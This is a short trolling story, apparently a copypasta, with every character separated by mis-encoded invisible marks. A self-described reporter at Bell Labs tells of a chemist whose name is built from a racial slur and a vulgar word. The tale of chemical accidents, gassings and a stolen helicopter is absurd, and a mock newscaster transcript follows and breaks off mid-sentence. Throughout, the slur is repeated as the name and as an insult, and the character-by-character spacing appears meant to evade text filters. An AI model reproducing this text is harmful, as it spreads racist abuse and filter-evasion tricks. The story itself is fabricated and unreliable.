‚ÄéK‚ÄéF‚ÄéO‚ÄéR‚Äé ‚Äéc‚Äéo‚Äér‚Äér‚Äée‚Äés‚Äép‚Äéo‚Äén‚Äéd‚Äée‚Äén‚Äét‚Äé ‚Äéd‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äéf‚Äéi‚Äée‚Äél‚Äéd‚Äé ‚Äér‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äé ‚Äéa‚Äét‚Äé ‚ÄéB‚Äée‚Äél‚Äél‚Äé ‚ÄéL‚Äéa‚Äéb‚Äés‚Äé.‚Äé ‚ÄéI‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéd‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚Äér‚Äée‚Äés‚Äée‚Äéa‚Äér‚Äéc‚Äéh‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äén‚Äée‚Äéu‚Äér‚Äéo‚Äét‚Äéo‚Äéx‚Äéi‚Äén‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äég‚Äéu‚Äée‚Äés‚Äés‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äée‚Äér‚Äés‚Äéo‚Äén‚Äé ‚ÄéI‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äép‚Äéa‚Äéi‚Äér‚Äée‚Äéd‚Äé ‚Äéu‚Äép‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé.‚Äé ‚ÄéN‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéC‚Äéo‚Äér‚Äén‚Äée‚Äél‚Äéi‚Äéu‚Äés‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé.‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé,‚Äé ‚Äéb‚Äée‚Äél‚Äéi‚Äée‚Äév‚Äée‚Äé ‚Äéi‚Äét‚Äé ‚Äéo‚Äér‚Äé ‚Äén‚Äéo‚Äét‚Äé,‚Äé ‚Äéh‚Äée‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äéa‚Äé ‚Äér‚Äée‚Äég‚Äéu‚Äél‚Äéa‚Äér‚Äé ‚Äés‚Äét‚Äéu‚Äép‚Äéi‚Äéd‚Äé ‚Äén‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äét‚Äéa‚Äél‚Äék‚Äée‚Äéd‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚ÄéK‚ÄéF‚ÄéC‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äét‚Äéa‚Äén‚Äét‚Äél‚Äéy‚Äé.‚Äé ‚ÄéH‚Äée‚Äé ‚Äég‚Äéo‚Äét‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚ÄéP‚Äéh‚ÄéD‚Äé ‚Äéi‚Äén‚Äé ‚Äéc‚Äéh‚Äée‚Äém‚Äéi‚Äés‚Äét‚Äér‚Äéy‚Äé ‚Äév‚Äéi‚Äéa‚Äé ‚Äéa‚Äéf‚Äéf‚Äéi‚Äér‚Äém‚Äéa‚Äét‚Äéi‚Äév‚Äée‚Äé ‚Äéa‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé.‚Äé ‚ÄéB‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äér‚Äée‚Äéj‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äél‚Äéa‚Äéb‚Äéo‚Äér‚Äéa‚Äét‚Äéo‚Äér‚Äéi‚Äée‚Äés‚Äé ‚Äéd‚Äéu‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äél‚Äéa‚Äés‚Äét‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äé,‚Äé ‚Äéh‚Äée‚Äé ‚Äéw‚Äéo‚Äér‚Äék‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äé ‚Äés‚Äém‚Äéa‚Äél‚Äél‚Äé ‚Äéf‚Äéa‚Äéc‚Äéi‚Äél‚Äéi‚Äét‚Äéy‚Äé ‚Äéd‚Äéo‚Äéw‚Äén‚Äét‚Äéo‚Äéw‚Äén‚Äé.‚Äé ‚Äé

W‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äép‚Äéa‚Äér‚Äét‚Äé ‚Äég‚Äéo‚Äét‚Äé ‚Äéa‚Äél‚Äéo‚Äén‚Äég‚Äé,‚Äé ‚Äéh‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé ‚Äéh‚Äée‚Äé ‚Äéb‚Äée‚Äéc‚Äéa‚Äém‚Äée‚Äé ‚Äét‚Äéi‚Äér‚Äée‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚Äév‚Äéa‚Äér‚Äéi‚Äéo‚Äéu‚Äés‚Äé ‚Äéi‚Äén‚Äéc‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äéi‚Äén‚Äév‚Äéo‚Äél‚Äév‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéh‚Äée‚Äém‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äéa‚Äég‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äéw‚Äée‚Äé ‚Äéw‚Äéo‚Äér‚Äék‚Äée‚Äéd‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé.‚Äé ‚ÄéI‚Äé ‚Äéa‚Äéc‚Äéc‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äés‚Äép‚Äéi‚Äél‚Äél‚Äée‚Äéd‚Äé ‚Äéa‚Äé ‚ÄéZ‚Äéy‚Äék‚Äél‚Äéo‚Äén‚Äé ‚Äép‚Äéa‚Äéc‚Äék‚Äéa‚Äég‚Äée‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äét‚Äéi‚Äém‚Äée‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äén‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äét‚Äéi‚Äém‚Äée‚Äé,‚Äé ‚ÄéI‚Äé ‚Äéa‚Äéc‚Äéc‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéf‚Äér‚Äée‚Äée‚Äéd‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äém‚Äéi‚Äéc‚Äée‚Äé ‚Äéa‚Äéf‚Äéf‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äén‚Äéu‚Äéc‚Äél‚Äée‚Äéa‚Äér‚Äé ‚Äéw‚Äéa‚Äés‚Äét‚Äée‚Äé.‚Äé ‚ÄéH‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé,‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äém‚Äéa‚Äéj‚Äéo‚Äér‚Äé ‚Äéi‚Äén‚Äéc‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé ‚Äéc‚Äéh‚Äéa‚Äén‚Äég‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äéi‚Äén‚Äég‚Äés‚Äé.‚Äé ‚ÄéW‚Äée‚Äé ‚Äéw‚Äée‚Äér‚Äée‚Äé ‚Äéw‚Äéo‚Äér‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äéa‚Äél‚Äé ‚Äép‚Äée‚Äét‚Äér‚Äéi‚Äé ‚Äéd‚Äéi‚Äés‚Äéh‚Äée‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéd‚Äéa‚Äéy‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äév‚Äée‚Äér‚Äéy‚Äé ‚Äél‚Äée‚Äéf‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéa‚Äé ‚Äéb‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé ‚Äéc‚Äéo‚Äén‚Äét‚Äéa‚Äéi‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéh‚Äée‚Äém‚Äéi‚Äéc‚Äéa‚Äél‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéc‚Äéa‚Äén‚Äé ‚Äég‚Äéi‚Äév‚Äée‚Äé ‚Äép‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚Äés‚Äéu‚Äép‚Äée‚Äér‚Äéi‚Äén‚Äét‚Äée‚Äél‚Äél‚Äéi‚Äég‚Äée‚Äén‚Äéc‚Äée‚Äé.‚Äé ‚ÄéI‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äé ‚Äéa‚Äé ‚Äét‚Äéi‚Äém‚Äée‚Äé ‚Äél‚Äéi‚Äém‚Äéi‚Äét‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚ÄéI‚Äé ‚Äéw‚Äéa‚Äés‚Äéh‚Äée‚Äéd‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéd‚Äéi‚Äés‚Äéh‚Äée‚Äés‚Äé,‚Äé ‚ÄéI‚Äé ‚Äéa‚Äéc‚Äéc‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéb‚Äéu‚Äém‚Äép‚Äée‚Äéd‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚Äép‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé,‚Äé ‚Äéc‚Äéa‚Äéu‚Äés‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äéh‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéa‚Äéu‚Äés‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéi‚Äéq‚Äéu‚Äéi‚Äéd‚Äé ‚Äéc‚Äéh‚Äée‚Äém‚Äéi‚Äéc‚Äéa‚Äél‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äép‚Äéo‚Äéu‚Äér‚Äé ‚Äéo‚Äéu‚Äét‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äéb‚Äés‚Äéo‚Äér‚Äéb‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äéi‚Äén‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé'‚Äés‚Äé ‚Äés‚Äék‚Äéi‚Äén‚Äé,‚Äé ‚Äém‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéh‚Äéi‚Äém‚Äé ‚Äéi‚Äém‚Äép‚Äée‚Äér‚Äév‚Äéi‚Äéo‚Äéu‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéo‚Äéx‚Äéi‚Äéc‚Äé ‚Äéc‚Äéh‚Äée‚Äém‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äéa‚Äég‚Äée‚Äén‚Äét‚Äés‚Äé.‚Äé ‚ÄéI‚Äé ‚Äéq‚Äéu‚Äéi‚Äéc‚Äék‚Äél‚Äéy‚Äé ‚Äéw‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äéd‚Äée‚Äéc‚Äéo‚Äén‚Äét‚Äéa‚Äém‚Äéi‚Äén‚Äéa‚Äén‚Äét‚Äés‚Äé,‚Äé ‚Äéh‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé,‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚ÄéI‚Äé ‚Äér‚Äée‚Äét‚Äéu‚Äér‚Äén‚Äée‚Äéd‚Äé,‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äéd‚Äéi‚Äéd‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéa‚Äén‚Äés‚Äéw‚Äée‚Äér‚Äé ‚Äém‚Äée‚Äé.‚Äé ‚ÄéM‚Äéo‚Äém‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äél‚Äéa‚Äét‚Äée‚Äér‚Äé,‚Äé ‚Äéh‚Äée‚Äé ‚Äét‚Äéu‚Äér‚Äén‚Äée‚Äéd‚Äé ‚Äéa‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äép‚Äéi‚Äéc‚Äék‚Äée‚Äéd‚Äé ‚Äéu‚Äép‚Äé ‚Äéa‚Äén‚Äé ‚Äée‚Äél‚Äée‚Äéc‚Äét‚Äér‚Äéo‚Äén‚Äé ‚Äém‚Äéi‚Äéc‚Äér‚Äéo‚Äés‚Äéc‚Äéo‚Äép‚Äée‚Äé,‚Äé ‚Äém‚Äée‚Äél‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéh‚Äéa‚Äén‚Äéd‚Äés‚Äé.‚Äé ‚ÄéI‚Äé ‚Äéq‚Äéu‚Äéi‚Äéc‚Äék‚Äél‚Äéy‚Äé ‚Äér‚Äéa‚Äén‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéu‚Äéi‚Äél‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äéc‚Äéa‚Äél‚Äél‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äép‚Äés‚Äé.‚Äé ‚ÄéT‚Äéw‚Äéo‚Äé ‚Äéd‚Äéo‚Äéc‚Äét‚Äéo‚Äér‚Äés‚Äé ‚Äéa‚Äét‚Äét‚Äée‚Äém‚Äép‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äér‚Äée‚Äés‚Äét‚Äér‚Äéa‚Äéi‚Äén‚Äé ‚Äéh‚Äéi‚Äém‚Äé,‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéZ‚Äéy‚Äét‚Äéh‚Äér‚Äée‚Äén‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéA‚Äés‚Äéh‚Äét‚Äéo‚Äén‚Äé.‚Äé ‚ÄéH‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé,‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äét‚Äéu‚Äér‚Äén‚Äée‚Äéd‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéh‚Äél‚Äéo‚Äér‚Äéi‚Äén‚Äée‚Äé ‚Äég‚Äéa‚Äés‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äér‚Äéo‚Äéo‚Äém‚Äé,‚Äé ‚Äés‚Äéu‚Äéf‚Äéf‚Äéo‚Äéc‚Äéa‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äéo‚Äét‚Äéh‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéa‚Äél‚Äéa‚Äér‚Äém‚Äés‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéa‚Äéc‚Äéi‚Äél‚Äéi‚Äét‚Äéy‚Äé ‚Äéw‚Äée‚Äén‚Äét‚Äé ‚Äéo‚Äéf‚Äéf‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äép‚Äée‚Äér‚Äés‚Äéo‚Äén‚Äén‚Äée‚Äél‚Äé ‚Äéa‚Äét‚Äét‚Äée‚Äém‚Äép‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéi‚Äén‚Äét‚Äée‚Äér‚Äév‚Äée‚Äén‚Äée‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äée‚Äés‚Äéc‚Äéa‚Äép‚Äée‚Äé.‚Äé ‚ÄéH‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé,‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äéa‚Äéc‚Äét‚Äéi‚Äév‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéa‚Äéc‚Äéi‚Äéd‚Äé ‚Äés‚Äép‚Äér‚Äéi‚Äén‚Äék‚Äél‚Äée‚Äér‚Äé ‚Äéa‚Äél‚Äéa‚Äér‚Äém‚Äés‚Äé,‚Äé ‚Äém‚Äée‚Äél‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äék‚Äéi‚Äén‚Äé ‚Äéo‚Äéf‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äéu‚Äéa‚Äér‚Äéd‚Äés‚Äé.‚Äé ‚ÄéH‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚Äée‚Äés‚Äéc‚Äéa‚Äép‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äés‚Äét‚Äée‚Äéa‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéa‚Äéb‚Äé'‚Äés‚Äé ‚Äép‚Äée‚Äér‚Äés‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚Äéh‚Äée‚Äél‚Äéi‚Äéc‚Äéo‚Äép‚Äét‚Äée‚Äér‚Äé.‚Äé ‚Äé

S‚Äéi‚Äén‚Äéc‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé,‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé ‚Äéb‚Äéa‚Äén‚Äén‚Äée‚Äéd‚Äé ‚Äém‚Äée‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéa‚Äéb‚Äéo‚Äér‚Äéa‚Äét‚Äéo‚Äér‚Äéy‚Äé.‚Äé ‚ÄéI‚Äé ‚Äéa‚Äét‚Äét‚Äée‚Äém‚Äép‚Äét‚Äée‚Äéd‚Äé ‚Äém‚Äéu‚Äél‚Äét‚Äéi‚Äép‚Äél‚Äée‚Äé ‚Äét‚Äéi‚Äém‚Äée‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äé ‚Äée‚Äéx‚Äée‚Äém‚Äép‚Äét‚Äée‚Äéd‚Äé.‚Äé ‚ÄéH‚Äée‚Äér‚Äée‚Äé'‚Äés‚Äé ‚Äéa‚Äé ‚Äét‚Äér‚Äéa‚Äén‚Äés‚Äéc‚Äér‚Äéi‚Äép‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äén‚Äéc‚Äéo‚Äéu‚Äén‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚ÄéI‚Äé ‚Äés‚Äée‚Äéc‚Äér‚Äée‚Äét‚Äél‚Äéy‚Äé ‚Äér‚Äée‚Äéc‚Äéo‚Äér‚Äéd‚Äée‚Äéd‚Äé:‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚ÄéN‚Äée‚Äéd‚Äéw‚Äéa‚Äér‚Äéd‚Äé ‚ÄéB‚Äée‚Äén‚Äéj‚Äéa‚Äém‚Äéi‚Äén‚Äé ‚ÄéN‚Äéu‚Äés‚Äée‚Äéc‚Äéa‚Äés‚Äét‚Äéo‚Äér‚Äé,‚Äé ‚ÄéC‚Äéa‚Äép‚Äét‚Äéa‚Äéi‚Äén‚Äé'‚Äés‚Äé ‚ÄéL‚Äéo‚Äég‚Äé.‚Äé ‚ÄéS‚Äét‚Äéa‚Äér‚Äéd‚Äéa‚Äét‚Äée‚Äé.‚Äé.‚Äé.‚Äé ‚Äé4‚Äé:‚Äé3‚Äé4‚Äé ‚ÄéP‚ÄéM‚Äé,‚Äé ‚ÄéM‚Äéo‚Äén‚Äéd‚Äéa‚Äéy‚Äé,‚Äé ‚ÄéA‚Äép‚Äér‚Äéi‚Äél‚Äé ‚Äé1‚Äé2‚Äé,‚Äé ‚Äé2‚Äé0‚Äé1‚Äé0‚Äé.‚Äé ‚ÄéI‚Äé ‚Äéa‚Äém‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äég‚Äéo‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äée‚Äél‚Äél‚Äé ‚ÄéL‚Äéa‚Äéb‚Äéo‚Äér‚Äéa‚Äét‚Äéo‚Äér‚Äéi‚Äée‚Äés‚Äé ‚ÄéF‚Äéa‚Äéc‚Äéi‚Äél‚Äéi‚Äét‚Äéy‚Äé ‚Äé‚Äî‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äés‚Äée‚Äél‚Äél‚Äé ‚Äém‚Äée‚Äér‚Äéc‚Äéu‚Äér‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé ‚Äé‚Äî‚Äé ‚Äét‚Äéo‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äém‚Äéy‚Äés‚Äée‚Äél‚Äéf‚Äé,‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äér‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äém‚Äéy‚Äés‚Äée‚Äél‚Äéf‚Äé ‚Äéu‚Äén‚Äéb‚Äéa‚Äén‚Äén‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äéf‚Äéo‚Äér‚Äég‚Äéi‚Äév‚Äée‚Äén‚Äée‚Äés‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äém‚Äéi‚Äés‚Äét‚Äéa‚Äék‚Äée‚Äé ‚ÄéI‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äém‚Äéa‚Äéd‚Äée‚Äé ‚Äéa‚Äél‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äéa‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äé ‚Äéa‚Äég‚Äéo‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚ÄéI‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéb‚Äéa‚Äén‚Äén‚Äée‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéa‚Äéb‚Äéo‚Äér‚Äéa‚Äét‚Äéo‚Äér‚Äéy‚Äé ‚Äéi‚Äén‚Äé ‚ÄéJ‚Äéu‚Äén‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äé2‚Äé0‚Äé0‚Äé8‚Äé.‚Äé

N‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé:‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéd‚Äéu‚Äéd‚Äée‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéb‚Äéa‚Äén‚Äén‚Äée‚Äéd‚Äé ‚Äém‚Äée‚Äé ‚Äéw‚Äéa‚Äés‚Äé,‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äé ‚ÄéP‚Äée‚Äén‚Äéi‚Äés‚Äé,‚Äé ‚Äép‚Äéo‚Äés‚Äés‚Äéi‚Äéb‚Äél‚Äéy‚Äé ‚Äéa‚Äé ‚Äéw‚Äéa‚Äét‚Äée‚Äér‚Äém‚Äée‚Äél‚Äéo‚Äén‚Äé ‚Äée‚Äén‚Äét‚Äéh‚Äéu‚Äés‚Äéi‚Äéa‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äéi‚Äéd‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äél‚Äéa‚Äés‚Äét‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äé.‚Äé ‚ÄéN‚Äéo‚Äét‚Äéh‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äéa‚Äéd‚Äé ‚Äéa‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äés‚Äé,‚Äé ‚Äéb‚Äéu‚Äét‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äéo‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äét‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé.‚Äé ‚ÄéA‚Äél‚Äér‚Äéi‚Äég‚Äéh‚Äét‚Äé,‚Äé ‚Äés‚Äéo‚Äé,‚Äé ‚Äéh‚Äée‚Äér‚Äée‚Äé ‚ÄéI‚Äé ‚Äég‚Äéo‚Äé.‚Äé

[‚ÄéN‚Äée‚Äéw‚Äés‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé ‚Äét‚Äéu‚Äér‚Äén‚Äés‚Äé ‚Äéo‚Äéf‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äén‚Äég‚Äéi‚Äén‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äél‚Äée‚Äéa‚Äév‚Äée‚Äés‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéc‚Äéa‚Äér‚Äé.‚Äé ‚ÄéH‚Äée‚Äé ‚Äéa‚Äép‚Äép‚Äér‚Äéo‚Äéa‚Äéc‚Äéh‚Äée‚Äés‚Äé ‚ÄéB‚Äée‚Äél‚Äél‚Äé ‚ÄéL‚Äéa‚Äéb‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéh‚Äéi‚Äém‚Äée‚Äé 